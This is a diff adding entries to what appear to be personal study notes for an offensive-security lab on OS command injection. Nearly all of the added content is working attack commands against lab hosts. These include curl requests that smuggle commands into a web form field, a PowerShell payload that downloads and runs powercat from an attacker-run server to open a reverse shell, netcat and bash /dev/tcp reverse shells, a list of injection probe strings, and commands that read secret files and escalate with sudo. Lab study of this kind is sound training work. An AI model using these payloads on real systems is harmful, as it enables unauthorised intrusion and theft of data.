@@ -668,6 +668,46 @@
      at kali@kali home: `rm ~/.ssh/known_hosts`  
      `ssh -p 2222 -i fileup root@mountaindesserts.com`  
 - 9.4.1 OS Command injection
+  - **PowerShell** reverse shell + windows
+    ```
+    1. Git command testing 
+    curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
+    curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+
+    determining where the injected commands are execute
+    curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
+
+    2. Server Powercat via web server
+    cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+    python3 -m http.server 80
+
+    3. netcat listen
+    nc -nvlp 4444
+
+    4. Exploit/curl
+    curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.170%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.170%20-p%204444%20-e%20powershell' http://192.168.203.189:8000/archive
+
+    5. Go to desktop and find the flag
+    cd C:\Users\Administrator\Desktop
+    type secrets.txt
+    ```    
+  - Netcat reverse shell + elevated priviledge (sudo su) + linux
+    `nc 192.168.45.170 4444 -e /bin/bash`
+    `curl -X POST --data 'Archive=nc%20192.168.45.170%204444%20-e%20%2Fbin%2Fbash' http://192.168.203.16/archive`
+    whoami  
+    sudo su  
+    cat /opt/config.txt  
+  - identify os command vulnerabilities + bash shell reverse shell
+    Test each input field one at a time (Burp intruter)
+    ```
+    ; id
+    && id
+    $(id)
+    `id`
+    ```
+    Before encode: "&&bash -c 'bash -i >& /dev/tcp/192.168.45.170/4444 0>&1'"  
+    Note: closes a previous string with ", then uses && to run a bash reverse shell connecting back to 192.168.45.170 on port 4444  
+    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.170/4444+0>%261'%22"`  
     
 ### Password Attacks  
 - 16.1.1 SSH and RDP
